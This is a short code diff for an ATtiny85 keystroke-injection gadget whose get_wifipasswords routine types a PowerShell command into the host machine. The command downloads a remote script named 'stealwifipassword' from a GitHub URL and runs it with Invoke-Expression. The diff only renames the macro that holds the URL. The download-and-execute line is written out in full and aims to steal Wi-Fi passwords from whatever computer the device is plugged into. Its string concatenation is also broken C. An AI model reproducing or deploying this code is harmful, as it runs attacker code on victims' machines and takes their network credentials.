@@ -3,7 +3,7 @@
 #define KEY_DOWN 0x51 // Keyboard Down Arrow
 #define KEY_ENTER 0x28 //Return/Enter Key
 
-#define stealScript "https://raw.githubusercontent.com/nactrimo/ATtiny85-Hacks/main/onecode"
+#define StealWifiScript "https://raw.githubusercontent.com/nactrimo/ATtiny85-Hacks/main/stealwifipassword"
 
 void setup() {
   // put your setup code here, to run once:
@@ -21,7 +21,7 @@ void get_wifipasswords() {
   my_delay(200);
   DigiKeyboardFr.println("powershell.exe ");
   my_delay(1000);
-  DigiKeyboardFr.println("Invoke-WebRequest -Uri "stealScript " -UseBasicParsing | Select-Object -ExpandProperty Content | Invoke-Expression");
+  DigiKeyboardFr.println("Invoke-WebRequest -Uri "StealWifiScript " -UseBasicParsing | Select-Object -ExpandProperty Content | Invoke-Expression");
   my_delay(5000); // wait untill powershell script finishes
 }
 
